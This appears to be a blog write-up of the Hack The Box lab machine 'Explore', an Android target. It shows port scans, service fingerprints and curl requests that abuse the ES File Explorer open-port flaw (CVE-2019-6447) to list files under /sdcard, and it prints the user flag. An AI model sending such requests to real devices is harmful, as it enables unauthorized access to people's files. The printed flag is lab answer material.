[**slyone999’s Security Blog**] (https://slyone999.github.io)

[//]: # (# -- 5 spaces before)
[//]: # (## -- 4 spaces before)
[//]: # (### -- 3 spaces before)
[//]: # (#### -- 2 spaces before)
[//]: # (##### -- 1 space before)

* TOC
{:toc}

# Info#

| Machine Name | explore |
| IP Address | 10.10.10.247 |
| OS | Android |

# Recon

## NMap
'''
rustscan -b 240 -a 10.10.10.247
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/user/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 924'.
Open 10.10.10.247:2222
Open 10.10.10.247:35317
Open 10.10.10.247:42135
Open 10.10.10.247:59777
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-10 12:20 BST
Initiating Ping Scan at 12:20
Scanning 10.10.10.247 [2 ports]
Completed Ping Scan at 12:20, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:20
Completed Parallel DNS resolution of 1 host. at 12:20, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:20
Scanning 10.10.10.247 [4 ports]
Discovered open port 35317/tcp on 10.10.10.247
Discovered open port 2222/tcp on 10.10.10.247
Discovered open port 59777/tcp on 10.10.10.247
Discovered open port 42135/tcp on 10.10.10.247
Completed Connect Scan at 12:20, 0.05s elapsed (4 total ports)
Nmap scan report for 10.10.10.247
Host is up, received conn-refused (0.059s latency).
Scanned at 2021-10-10 12:20:52 BST for 0s

PORT      STATE SERVICE      REASON
2222/tcp  open  EtherNetIP-1 syn-ack
35317/tcp open  unknown      syn-ack
42135/tcp open  unknown      syn-ack
59777/tcp open  unknown      syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds
'''

Results and problems with using rustscan and nmap

'''
nmap -sV -p 2222 10.10.10.247 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-10 20:27 BST
Nmap scan report for 10.10.10.247
Host is up (0.046s latency).

PORT     STATE SERVICE VERSION
2222/tcp open  ssh     (protocol 2.0)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port2222-TCP:V=7.92%I=7%D=10/10%Time=61633EC2%P=x86_64-pc-linux-gnu%r(N
SF:ULL,24,"SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.10 seconds
┌─[user@parrot-virtual]─[~/Documents/HTB/explore]
└──╼ $nmap -sV -p 35317 10.10.10.247 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-10 20:28 BST
Nmap scan report for 10.10.10.247
Host is up (0.025s latency).

PORT      STATE SERVICE VERSION
35317/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port35317-TCP:V=7.92%I=7%D=10/10%Time=61633EDA%P=x86_64-pc-linux-gnu%r(
SF:GenericLines,AA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Sun,\x2
SF:010\x20Oct\x202021\x2019:28:27\x20GMT\r\nContent-Length:\x2022\r\nConte
SF:nt-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n
SF:\r\nInvalid\x20request\x20line:\x20")%r(GetRequest,5C,"HTTP/1\.1\x20412
SF:\x20Precondition\x20Failed\r\nDate:\x20Sun,\x2010\x20Oct\x202021\x2019:
SF:28:27\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,B5,"HTTP/1
SF:\.0\x20501\x20Not\x20Implemented\r\nDate:\x20Sun,\x2010\x20Oct\x202021\
SF:x2019:28:33\x20GMT\r\nContent-Length:\x2029\r\nContent-Type:\x20text/pl
SF:ain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nMethod\x20not\x
SF:20supported:\x20OPTIONS")%r(RTSPRequest,BB,"HTTP/1\.0\x20400\x20Bad\x20
SF:Request\r\nDate:\x20Sun,\x2010\x20Oct\x202021\x2019:28:33\x20GMT\r\nCon
SF:tent-Length:\x2039\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\
SF:r\nConnection:\x20Close\r\n\r\nNot\x20a\x20valid\x20protocol\x20version
SF::\x20\x20RTSP/1\.0")%r(Help,AE,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nD
SF:ate:\x20Sun,\x2010\x20Oct\x202021\x2019:28:48\x20GMT\r\nContent-Length:
SF:\x2026\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnectio
SF:n:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20HELP")%r(SSLSessionRe
SF:q,DD,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Sun,\x2010\x20Oct\
SF:x202021\x2019:28:48\x20GMT\r\nContent-Length:\x2073\r\nContent-Type:\x2
SF:0text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nInvalid
SF:\x20request\x20line:\x20\x16\x03\0\0S\x01\0\0O\x03\0\?G\?\?\?,\?\?\?`~\
SF:?\0\?\?{\?\?\?\?w\?\?\?\?<=\?o\?\x10n\0\0\(\0\x16\0\x13\0")%r(TerminalS
SF:erverCookie,CA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Sun,\x20
SF:10\x20Oct\x202021\x2019:28:48\x20GMT\r\nContent-Length:\x2054\r\nConten
SF:t-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\
SF:r\nInvalid\x20request\x20line:\x20\x03\0\0\*%\?\0\0\0\0\0Cookie:\x20mst
SF:shash=nmap")%r(TLSSessionReq,DB,"HTTP/1\.0\x20400\x20Bad\x20Request\r\n
SF:Date:\x20Sun,\x2010\x20Oct\x202021\x2019:28:48\x20GMT\r\nContent-Length
SF::\x2071\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnecti
SF:on:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20\x16\x03\0\0i\x01\0\
SF:0e\x03\x03U\x1c\?\?random1random2random3random4\0\0\x0c\0/\0");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.32 seconds
┌─[user@parrot-virtual]─[~/Documents/HTB/explore]
└──╼ $nmap -sV -p 42135 10.10.10.247 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-10 20:30 BST
Nmap scan report for 10.10.10.247
Host is up (0.028s latency).

PORT      STATE SERVICE VERSION
42135/tcp open  http    ES File Explorer Name Response httpd
Service Info: Device: phone

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.74 seconds
┌─[user@parrot-virtual]─[~/Documents/HTB/explore]
└──╼ $nmap -sV -p 59777 10.10.10.247 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-10 20:31 BST
Nmap scan report for 10.10.10.247
Host is up (0.038s latency).

PORT      STATE SERVICE VERSION
59777/tcp open  http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.53 seconds
'''

| Port | Service |
| 2222 | Banana Studio SSH |
| 35317 | Unknown web response |
| 42135 | ES File Explorer Name Response httpd |
| 59777| Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older |

The Banana Studio port could be vulnerable to a CVE but needs payload sent, need to find a way to inject payload.

Is this relevant - https://medium.com/@knownsec404team/analysis-of-es-file-explorer-security-vulnerability-cve-2019-6447-7f34407ed566

'''
curl --header "Content-Type: application/json" --request POST --data "{\"command\":\"listFiles\"}" http://10.10.10.247:59777

'''
This works so nneed to work out how to get the user.txt file

The following looks like a POC for this https://github.com/fs0c131y/ESFileExplorerOpenPortVuln
Fuzz the curl request and the following appears to work 
'''
curl --header "Content-Type: application/json" --request POST --data "{\"command\":\"listFiles\"}" http://10.10.10.247:59777/sdcard
'''

Access this url from a browser and the user.txt is returned f32017174c7c7e8f50c6da52891ae250
